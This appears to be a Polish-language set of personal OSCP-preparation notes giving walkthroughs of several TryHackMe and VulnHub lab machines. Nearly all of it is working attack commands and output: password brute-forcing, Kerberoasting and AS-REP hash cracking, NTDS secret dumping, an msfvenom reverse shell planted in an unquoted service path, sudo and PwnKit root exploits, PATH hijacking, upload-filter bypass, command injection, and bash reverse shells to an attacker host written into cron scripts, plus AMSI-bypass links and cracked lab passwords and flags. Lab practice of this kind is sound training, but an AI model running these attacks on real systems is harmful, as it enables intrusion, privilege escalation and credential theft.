hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://IP_Maszyny
(hasło: crystal)

ftp IP_maszyny
Chris/crystal
#pobieramy pliki z ftp (To_agentJ.txt, cute-alien.jpg, cutie.png)
    mget *

cat To_agentJ.txt
#sprawdzamy opbrazki:
    steghide info cutie.png
    steghide info cute-alien.jpg
    binwalk cutie.png
    binwalk cutie.png -e (dostajemy zip i plik TO_agentR.txt)
    cd _cutie.png.extracted
    unzip 8702.zip
    zip2john 8702.zip > hashasla
    john hashasla
    7z e 8702.zip
    ls
    cat To_agent.txt
    echo "QXJlYTUx" | base64 -d
    steghide info cute-alien.jpg
    steghide extract -sf cute-alien.jpg
    cat message.txt
    (james:hackerrules!)
    (To_agent R.txt:Area51)
#flaga:
    cat user_flag.txt
    
    id
    sudo -V
#szukamy exploit-a:
    cve-2019-14287
    https://www.exploit-db.com/exploits/47502
    sudo -l
    sudo -u#-1 /bin/bash
    id

<root dance>
#flaga:
    cat /root/root.txt
    
***

### 📋 Enterprise
(https://tryhackme.com/room/enterprise)

nmap IP_maszyny
nmap IP_maszyny -Pn
nmap IP_maszyny -A
enum4linux IP_maszyny #nic ciekawego
smbmap -H IP_maszyny #nic ciekawego
nano /etc/host

    IP_maszyny lab.enterprise.thm lab-dc.lab.enterprise.thm

    ping lab.enterprise.thm

    ping lab-dc.lab.enterprise.thm


./kerbrute_linux_amd64 userenum -d lab.enterprise.thm --dc lab-dc.lab.enterprise.thm userlist.txt -t 10

#wyenumerowana lista userów (zapisujemy do pliku users):
banana@lab.enterprise.thm
guest@lab.enterprise.thm
administrator@lab.enterprise.thm
cake@lab.enterprise.thm
enterprise@lab.enterprise.thm
nik@lab.enterprise.thm
Guest@lab.enterprise.thm
Administrator@lab.enterprise.thm
Banana@lab.enterprise.thm
spooks@lab.enterprise.thm
joiner@lab.enterprise.thm
Nik@lab.enterprise.thm
GUEST@lab.enterprise.thm
BANANA@lab.enterprise.thm

python3 GetNPUsers.py -dc-ip lab.enterprise.thm lab-dc.lab.enterprise.thm/ -usersfile users -no-pass   

nikto -h lab.enterprise.thm

gobuster dir -u http://lab.enterprise.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

#szukamy podpowiedzi
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

#tworzymy skrtypt z nazwą smb.sh o treści:
    #!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1

#uruchamiamy:
    bash smb.sh lab.enterprise.thm
    
nmap --script "safe or smb-enum-*" -p 445 <IP_maszyny>

smbclient -L IP_maszyny -U ""      #hasło puste
smbclient \\\\IP_maszyny\\Docs
dir   #są 2 pliki

    RSA-Secured-Credentials.xlsx

    RSA-Secured-Document-PII.docx


mget *
exit
smbclient \\\\IP_maszyny\\Users
dir  #są katalogi

smb: \> ls
  Administrator
  All Users
  atlbitbucket
  bitbucket
  Default
  Default User
  LAB-ADMIN
  Public

🔗 -- Windows - DPAPI
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md


Pliki są zahasłowane:

    RSA-Secured-Credentials.xlsx

    RSA-Secured-Document-PII.docx


Atlassian - panel logowania
http://lab.enterprise.thm:7990/

Informacja:

    Reminder to all Enterprise-THM Employees:

    We are moving to Github!


Wyszukiwanie Google:
    
    site:github.com "Enterprise-THM"

https://github.com/Enterprise-THM

https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8

    $userPassword = 'ToastyBoi!'
    $userName = 'nik'


Logowanie za pomocą rdesktop - niemożliwe
 
rdesktop lab.enterprise.thm
lab.enterprise.thm\nik
<password>

smbclient -L lab.enterprise.thm -U 'nik'
Password for [WORKGROUP\nik]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!


rpcclient lab.enterprise.thm -U nik

rpcclient $> enumdomusers

    user:[Administrator] rid:[0x1f4]

    user:[Guest] rid:[0x1f5]

    user:[krbtgt] rid:[0x1f6]

    user:[atlbitbucket] rid:[0x3e8]

    user:[bitbucket] rid:[0x452]

    user:[nik] rid:[0x453]

    user:[replication] rid:[0x454]

    user:[spooks] rid:[0x455]

    user:[korone] rid:[0x456]

    user:[banana] rid:[0x457]

    user:[Cake] rid:[0x458]

    user:[contractor-temp] rid:[0x45c]

    user:[varg] rid:[0x45d]

    user:[joiner] rid:[0x45f]


Dodajemy nowych userów do pliku users
atlbitbucket
bitbucket
replication
korone
contractor-temp
varg

# Bloodhound

sudo apt install bloodhound.py

bloodhound-python -u nik -p 'ToastyBoi!' -ns <IP maszyny> -d lab.enterprise.thm -c all

INFO: Found AD domain: lab.enterprise.thm
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: lab-dc.lab.enterprise.thm
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: lab-dc.lab.enterprise.thm
INFO: Connecting to GC LDAP server: lab-dc.lab.enterprise.thm
INFO: Found 15 users
INFO: Found 51 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: LAB-DC.LAB.ENTERPRISE.THM
INFO: Done in 00M 13S


Otrzymujemy pliki do analizy:

    20230312085535_computers.json

    20230312085535_containers.json

    20230312085535_domains.json

    20230312085535_gpos.json

    20230312085535_groups.json

    20230312085535_ous.json

    20230312085535_users.json






GetUserSPNs

cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .

python GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158  

#Pozyskujemy hasha

python GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             

$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$e9ae8ab7ca37c6e98fc6087a6eb345c1$3cc68d2665413e75e63d45ded17dcef172f06fd094c4609ed01ad885e44763e30fef0bd5c0931c794d44fe0b85162789f4a2df96011b948a61ac8fb6094085fc894eb902e6e83c152f9f569ee139e8ff72f9188db7d73e4bc3e8469ebf5b0959a3855ba9c34b3d8c466e80c622b72381b760f16d461b31257d673c134c23e547f0dcbde0913d1ef044e343fc862055b3b582972ecf8e5354b5a609285448256a2058f8771c31cf557613c2aae0931ccc50aeea168dd66d314fb91de875a3d87e69d278cb717956f3e568d9e99c74d36f0379b54a9d2041dfcaa03887aa0fc2545a8430c995dcb9a66f957e83b79ac50fe92489a1aff7b0da0e7f6b5cbcedf40412266478ccdd8edbc963a16a40761ad651865a0b6a4785a4f80c7e52d748e59e6e35f7cd45b2deb6d3b167c18e098a6bff7bb881ac8749a17729486f505d724843768c10961a5e92310a60226666576cff068d714ec23b3d0f294c7801a0d741d080fe19538eacccfa79307a084ae33061a6c793a890c1fc0541a0b7e2b8bcafb0735b58a2c105c09662177db41a7de1f8462da7bbfd985462302801e0ce1ec076f0077f841b43f8a3aa4a1119df2c9c617115d109825775ab25005c39ea7ac950db16c61089d192963eed1212e2c136a8da97f5e03682182c3f02c1e245b6cdcaf662eca267de7b84560de7ecadbea932af0db32b0d95deed4f9e7e5df761a9b9139836a88b73708dfc3a90cad3b7f6b6d72de37ea54ee7ac6d3475e5e0c811227ab73c5f6a0092dac13bbbd489a7af23487bb0554ec9caa3a5a651ab523d1d9f0a024d6080caaa795d74aa2faa0628975a052689e1587f7d667219d05cb9d28525e15ae3035d15655295a2ffd36a6f2f57cb0f2d6a903dd9bcb1d16c62866a450482187f5885eba1d0580c1861b5c3c961250a3ebd64d09564333c7edf492057bbb6130ae083644022a19284b6b413b4ef79c7bb5c60843770f2367f9dbd5ee9cfa799b2646f5bccb4d6c04b7099c30ead7535ff254a8d6f74c9b6729e966cb67a5a5f2795c61679543f37c5d3e6dfd36b36c0d7f8cb15691fd90c283514c6b5f4455cd3fab8487622f3a19754f4d5bffd790fafd59bb5b0c1eb4aab8fec33b319cc603b170ec455cc1b28d4c28349127187b96a07e7b6c60574ff4be17418d7686f6746e9a2c2daddc3b260261bc4c82d1cfcd9ce26bcad298050ab1fbd2893fdaaba5c4974dd5f4e86a52cdce34ae8fc677bbae0e6b1c0018d88047a9178d09730804099b0ad4ef0bdfbfdc084c26ec8d083d6f400eb63e09e0fb9c2a34b8a5e7e258875023b92002604d3b71d06f57a49366fc525c507e6008d0b0cf7d4ebd658


Kopiujemy hash do nowego pliku kerhash i łamiemy hashcatem

hashcat -m 13100 kerhash /usr/share/wordlists/rockyou.txt

Cracked: littleredbucket


#Ponowne logowanie rdesktop

bitbucket:littleredbucket

rdesktop lab.enterprise.thm

lab.enterprise.thm\bitbucket

user.txt
THM{ed882d02b34246536ef7da79062bef36}


Enumeracja z wykorzystaniem WinPEAS
https://github.com/carlospolop/PEASS-ng/releases/download/20230312/winPEASx64.exe

locate Powerup.ps1
lub
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

python -m http.server 80

Set-ExecutionPolicy unrestricted -Scope currentuser
Import-Module .\PowerUp.ps1
Invoke-AllChecks

Podatność Unquoted Service Path

    ServiceName : zerotieroneservice

    Path : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe


Umieszczenie Reverse Shell w podatnej ścieżce

msfvenom -p windows/shell_reverse_tcp LHOST=<IP Maszyny> LPORT=443 -f exe > Zero.exe

Umieszczamy plik Zero.exe w katalogu:
    
C:\Program Files (x86)\Zero Tier

Stop-Service -name "zerotieroneservice"
Start-Service -name "zerotieroneservice"

#Po restarcie serwisu otrzymujemy sesję

└─$ nc -nlvp 443 
listening on [any] 443 ...

Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

c:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1a1fa94875421296331f145971ca4881}

***

### 📋 RazorBlack (THM)
https://tryhackme.com/room/raz0rblack

nmap razorblack  

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

/etc/hosts

    <IP Maszyny> raz0rblack.thm HAVEN-DC.raz0rblack.thm


#Podmontowanie zasobu
showmount -e raz0rblack.thm

mkdir punktmontowania
sudo mount raz0rblack.thm:/users /home/kali/Downloads/razor/punktmontowania

cd punktmontowania

#Lista userów uzyt
dport
iroyc
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin

#Pozyskanie haszy userów

impacket-GetNPUsers -no-pass raz0rblack.thm/ -usersfile uzyt -format hashcat -outputfile hasze

cat hasze            
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:dae71c1d2ba6d62b70cc93a4d94fbcd1$65c1a15cd88126d8267ec3408040ed039f3c4f752b694381dca127afb45027cd05b3db8a525c0fb00de0a3f4d43d4504cc95779fc9c84452d4a5def15cefa2ee4d7431c81e5a367d234dcec5851a748f06d57d6acef9796955e4c6884d06a9b17af8c94b5e128dc7d7aa6d5e18401bbae33d74bd303de9d0b9ebcb0d2c1504df653d7d7c859a8a83d2d9cbd8356c7723475a91323bd5ea5e9d28804402d3800ea3af161d12406b6140dc7d0f793da90cfe997190873dd5a7d52ac3bd807f78e37c8d61f6805048a8240a837841878baed7f2fff276efdc0a21bb398fa3398ec57c83f31f2b2847aef50de640aad3a5f0

hashcat -m 18200 hasze /usr/share/wordlists/rockyou.txt

twilliams:roastpotatoes

#Logowanie do smb
smbmap -H raz0rblack.thm -u 'twilliams' -p 'roastpotatoes'

smbclient \\\\raz0rblack.thm\\trash -U 'twilliams'
smbclient \\\\raz0rblack.thm\\SYSVOL -U 'twilliams'
smbclient \\\\raz0rblack.thm\\NETLOGON -U 'twilliams'
#Brak interesujących plików

Password Spraying

crackmapexec smb raz0rblack.thm -u uzyt -p haslo

Komentujemy #twilliams w pliku uzyt

raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 

#Zmiana hasła przez smb
smbpasswd -r raz0rblack.thm -U sbradley
Old SMB password: roastpotatoes
New SMB password: testing0
Retype new SMB password: testing0
Password changed for user sbradley


smbmap -H raz0rblack.thm -u 'sbradley' -p 'testing0'

smbclient \\\\raz0rblack.thm\\trash -U 'sbradley'

Password for [WORKGROUP\sbradley]:testing0

smb: \> ls
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021

smb: \> mget *

zip2john experiment_gone_wrong.zip > haszyk 

john --wordlist=/usr/share/wordlists/rockyou.txt haszyk 
electromagnetismo (experiment_gone_wrong.zip)     

7z e experiment_gone_wrong.zip

Files: 2
Size:       75001856
Compressed: 18927164

58720256 Mar 16  2021 ntds.dit
16281600 Mar 16  2021 system.hive

#Zrzut sekretów z plików system.hive i ntds.dit
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL > wynik

opcja

    cat wynik | cut -d ':' -f 4 > extracthashes.txt


Plik z hashami kandydaci
https://pastebin.com/qnJE0gT4

crackmapexec smb raz0rblack.thm -u lvetrova -H kandydaci


📅 18.03.2023 🕘 [09:00]

OSCP Preparation Day 5 
= - = - = - = - = - = 

# AMSI Bypass Methods
https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/
https://www.contextis.com/us/blog/amsi-bypass
https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/

# DLL Hijacking
https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/

# AMSI Bypass generator
https://amsi.fail/
https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/

https://pentestlab.blog/tag/amsi/
https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/
https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/

==========

https://www.vulnhub.com/entry/devguru-1,620/
https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/
https://www.vulnhub.com/entry/misdirection-1,371/

🔗 -- Zmiany w OSCP (03.2023)
https://www.offsec.com/offsec/pen-200-2023/

Bloodhound dokończenie - rozwiązanie kiedy nie działa bloodhound-python na najnowszej dystrybucji Kali
https://github.com/iphelix/dnschef.git
git clone https://github.com/iphelix/dnschef.git

sudo sh -c 'python3 dnschef.py --fakeip <IP maszyny> --fakedomains lab.enterprise.thm -q'

Nowy terminal:
bloodhound-python -u nik -p 'ToastyBoi!' -d lab.enterprise.thm -ns 127.0.0.1 -dc lab.enterprise.thm -c all --dns-timeout 10

🔗 -- Poprzednie dystrybucje Kali:
https://old.kali.org/kali-images/kali-2022.2/

***

### 📋 Kenobi
https://tryhackme.com/room/kenobi

nmap kenobi.thm

nmap kenobi.thm -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse

    Podłączenie do SMB

smbclient //kenobi.thm/anonymous
smb: \> get log.txt #lub mget * dla wszystkich plików w katalogu

cat log.txt

    # This is a basic ProFTPD configuration file (rename it to 

    # 'proftpd.conf' for actual use.  It establishes a single server

    # and a single anonymous login.  It assumes that you have a user/group

    # "nobody" and "ftp" for normal operation and anon.

    ServerName                      "ProFTPD Default Installation"


    Próba połącznenia z ftp

ftp kenobi.thm 

    Connected to kenobi.thm.

    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) 

    ftp: Login failed


    Przechwycenie banneru serwisu:

nc kenobi.thm 21

    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) 


    Znane podatności

searchsploit ProFTPD 1.3.5

                                                                 🔗 -- ProFTPd 1.3.5 - File Copy
https://www.exploit-db.com/exploits/36742


    W pliku log.txt znajdujemy informacje o kluczach ssh

    Generating public/private rsa key pair.

    Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 

    Created directory '/home/kenobi/.ssh'.

    Enter passphrase (empty for no passphrase): 

    Enter same passphrase again: 

    Your identification has been saved in /home/kenobi/.ssh/id_rsa.

    Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.

    The key fingerprint is:

    SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi


    \home\kenobi\share

    z wyników nmap:

    \\kenobi.thm\anonymous: 

    |     Type: STYPE_DISKTREE

    |     Comment: 

    |     Users: 0

    |     Max Users: <unlimited>

    |     Path: C:\home\kenobi\share

    |     Anonymous access: READ/WRITE

    |     Current user access: READ/WRITE


    Ponowne łączenie z ftp przez nc i wykorzystanie informacji z exploit-db


nc kenobi.thm 21

    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) 


site cpfr /home/kenobi/.ssh/id_rsa

    350 File or directory exists, ready for destination name


site cpto /home/kenobi/share/id_rsa

    250 Copy successful


    Klucz znajduje się w poniższym katalogu


smbclient //kenobi.thm/anonymous

smb: \> ls
  id_rsa          N     1675  Sat Mar 18 05:28:00 2023


    Pobieramy klucz na kali

    smb: \> mget *

    Get file id_rsa? y


    Zmieniamy uprawnienia pliku:

    chmod 600 id_rsa


    Logujemy się na ssh za pomocą klucza

    ssh -i id_rsa kenobi@kenobi.thm


    Enumeracja systemu:

    cat /home/kenobi/user.txt
    

    Linpeas.sh


    CVE-2021-4034

https://github.com/berdav/CVE-2021-4034
git clone https://github.com/berdav/CVE-2021-4034.git

    Pakujemy zawartość

tar -czvf plik CVE-2021-4034

    Rozpakowujemy na hoscie docelowym

kenobi@kenobi:~$ tar -xzvf plik

    Kompilacja i uruchomienie exploita


kenobi@kenobi:~/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
kenobi@kenobi:~/CVE-2021-4034$ ./cve-2021-4034

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare),1000(kenobi)

cat /root/root.txt

    Wracamy do Linpeas


╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 8.7K Sep  4  2019 /usr/bin/menu (Unknown SUID binary!)

kenobi@kenobi:~/CVE-2021-4034$ menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :


1. status check > curl

    Zmiana kolejności poszukiwania plików binarnych przez system


    Tworzymy nowy plik curl

    kenobi@kenobi:~$ mkdir bin

    kenobi@kenobi:~$ cd bin/

    kenobi@kenobi:~/bin$ echo /bin/bash > curl

    kenobi@kenobi:~/bin$ chmod 777 curl 


Wykonujemy plik menu
kenobi@kenobi:~/bin$ menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:~/bin# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)


    Przypadek kiedy nie ma 2 pierwszych wpisów w $PATH /home/kenobi/bin:/home/kenobi/


echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

    Nowy curl w katalogu siema


mkdir siema
echo /bin/bash > curl
chmod 777 curl

Dopisanie do zmiennej $PATH katalogu /home/kenobi/siema
export PATH=/home/kenobi/siema:$PATH

kenobi@kenobi:~$ mkdir siema
kenobi@kenobi:~$ cd siema/
kenobi@kenobi:~/siema$ echo /bin/bash > curl
kenobi@kenobi:~/siema$ chmod 777 curl
kenobi@kenobi:~/siema$ export PATH=/home/kenobi/siema:$PATH
kenobi@kenobi:~/siema$ echo $PATH
/home/kenobi/siema:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:~/siema$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:~/siema# whoami
root

***

### 📋 Vulnversity
https://tryhackme.com/room/vulnversity

http://vulnversity.thm:3333/

    Upload plików

http://vulnversity.thm:3333/internal

locate php-reverse-shell
Nie można wykonac uploadu php

    Burp 

Przychwutyjemy żądanie POST
http://vulnversity.thm:3333/internal/index.php

POST /internal/index.php HTTP/1.1

    Burp Intruder


------WebKitFormBoundarySJyg36VdCpMXGNf5

Content-Disposition: form-data; name="file"; filename="php-reverse-shell.§php§"
Content-Type: application/x-php

Payload:
php2
php3
php4
php5
php6
php7
phtml
    

    Plik z rozszerzeniem phtml można załadować:


HTTP/1.1 200 OK
[...]
Success</body>

    Plik znajduje się w lokalizacji

http://vulnversity.thm:3333/internal/uploads/

    Uruchamiamy z przeglądarki: 

php-reverse-shell.phtml

    Otrzymujemy sesję revese-shell


┌──(kali㉿kali)-[~/vulnversity]
└─$ nc -nlvp 4488             
listening on [any] 4488 ...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

Upgrade shella:
    python -c 'import pty; pty.spawn("/bin/bash")'

cat /home/bill/user.txt

Uruchamiamy LinPeas.
#szukamy podpowiedzi:
    https://gtfobins.github.io/gtfobins/systemctl/
#kopiować kolejno:
    sudo install -m =xs $(which systemctl) .
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "id > /tmp/output"
    [Install]
    WantedBy=multi-user.target' > $TF
    ./systemctl link $TF
    ./systemctl enable --now $TF
    
    cd /tmp
    ll
    cat output
    nc
    bash -p
    id
    
***

### 📋 convertmyvideo

https://tryhackme.com/room/convertmyvideo

nmap ip_maszyny
nmap ip_maszyny -A
nmap ip_maszyny -p-
nikto -h IP_maszyny

#prześliedzić zapytania w burp
#osadzić w Video ID:
    "id"
    'id'
    `id` - dostaliśmy info o id
    `ls`
    'ls>siema2'
    http://IP_maszyny/siema2
    `cat${IFS}/ets/passswd>simea3`
    `wget${IFS}Ip_kali/siema`   #na kalim: python -m http.server 80
    
#przesyłamy reverseshell (php-revershe-shell.php) wcześniej zmieniamy nazwę na rev.php
`wget${IFS}Ip_kali/rev.php'

nc -nvlp 1234
http://IP_maszyny/rev.php

id
cd /var/www/html
ls
cd admin
ls
ls -al
cat .htaccess
cat .htpasswd

#wynik pliku .htpasswd zapisujemy do pliku hash
john hash
jessie (itsmeadmin)

cat /etc/cron*
cd /var/www/html/tmp
ls -al
cat index.php

#link do pspy:
https://github.com/DominicBreuker/pspy
#na kalim: python -m http.server 80
wget ip_kali/pspy64
chmod +x pspy64
./pspy64
id
echo "bash -i >& /dev/tcp/IP_kali/4444 0>&1" > /var/www/html/tmp/clean.sh 

#link do reverse shell generator
https://www.revshells.com/
***

### 📋 Anonymous

https://tryhackme.com/room/anonymous

nmap ip_maszyny
nmap ip_maszyny -A
nmap ip_maszyny -p-

ftp IP_maszyny
mget *
pliki: clean.sh, removed_files.log, to_do.txt

smbmap -H Ip_maszyny

smbclient //Ip_maszyny/pics
mget *
obrazki corgo2.jpg, puppos.jpg

nano clean.sh
#!/bin/bash
bash -i >& /dev/tcp/IP_kali/4444 0>&1 

put clean.sh

nc -nvlp 4444

#pomysł na rozwiązanie:
    https://www.tecmint.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux/
    
    find . -perm /4000
    find / -perm /4000 2>/dev/null
    .env /bin/sh -p
    env /bin/sh -p
    id
    whami
    
***

### 📋 DevGuru
(maszyna z vulnhub)

nmap ip_maszyny
nmap ip_maszyny -A
nmap ip_maszyny -p 8585 -A
nmap ip_maszyny -p-
nikto -h Ip_maszyny
http://ip_maszyny
http://ip_maszyny:8585
dirb http://ip_maszyny
gobuster dir -u Ip_maszyny -w /usr/share/dirb/wordlist/common.txt -t 50

http://ip_maszyny/backend
http://ip_maszyny/.htaccess
http://ip_maszyny/adminer.php

#narzędzie do zapisywania obrazu/ zawartości:
https://github.com/arthaud/git-dumper

pip install git-dumper
cd /home/kali/local/bin
./git-dumper.py http://ip_maszyny/.git /home/kali/devguru
cd /home/kali/devguru
tree
cat devguru/config/database.php

#należy zalogować się jako: october:
      'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],

#sprawdzić bazę: backend_users
#analiza hashy:
    https://www.tunnelsup.com/hash-analyzer/
#generujemy hash hasła:
    https://www.devglan.com/online-tools/bcrypt-hash-generator
#wygenerowane hasło podmieniamy w bazie w polu password
#logujemy się jako Frank i podmienione hasło

🏠 Homework
dokończenie zadania 
